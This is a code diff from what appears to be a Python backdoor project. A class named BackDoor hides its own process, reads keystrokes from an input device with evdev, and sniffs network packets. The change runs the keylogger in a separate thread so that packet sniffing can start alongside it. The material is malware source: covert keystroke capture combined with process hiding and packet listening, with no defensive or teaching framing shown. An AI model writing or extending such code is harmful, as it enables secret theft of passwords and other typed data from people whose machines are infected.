@@ -11,6 +11,7 @@ import yaml
 import asyncio
 from evdev import InputDevice, ecodes, categorize
 import time
+from threading import Thread
 
 key_code_map = {
     0: '',
@@ -139,13 +140,15 @@ class BackDoor:
         self.hide_process()
         print("Starting.....")
         try:
-            self.start_keylogger()
+            keylog_t = Thread(target=self.start_keylogger)
+            keylog_t.start()
+            print("Keylogger started")
+            print("Listening for packets")
+            print("--------------------------------------------------------------")
+            self.sniff_init()
         except KeyboardInterrupt as e:
             sys.exit(" Closed")
-        print("Keylogger started")
-        print("Listening for packets")
-        print("--------------------------------------------------------------")
-        self.sniff_init()
+
 
     def start_keylogger(self):
         device = InputDevice(self.device)
